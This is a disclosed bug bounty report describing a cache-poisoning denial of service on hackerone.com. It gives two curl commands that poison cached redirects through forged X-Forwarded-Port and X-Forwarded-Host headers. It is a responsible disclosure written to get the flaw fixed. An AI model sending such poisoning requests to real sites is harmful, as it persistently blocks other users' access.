# Denial of service via cache poisoning

## Report Details
- **Report ID**: 409370
- **URL**: https://hackerone.com/reports/409370
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-09-13T10:14:16.500Z
- **Disclosed**: 2018-12-22T16:16:11.543Z

## Reporter
- **Username**: albinowax
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port.

To replicate: 
```curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1```
Then try to load https://www.hackerone.com/index.php?dontpoisoneveryone=1 in your browser.

This attack can also be done using the X-Forwarded-Host header:
```curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1```


For more information on the theory behind this attack, check out https://portswigger.net/blog/practical-web-cache-poisoning

## Impact

An attacker can persistently block access to any/all redirects on www.hackerone.com

## Attachments
- Screen_Shot_2018-09-13_at_11.08.12.png
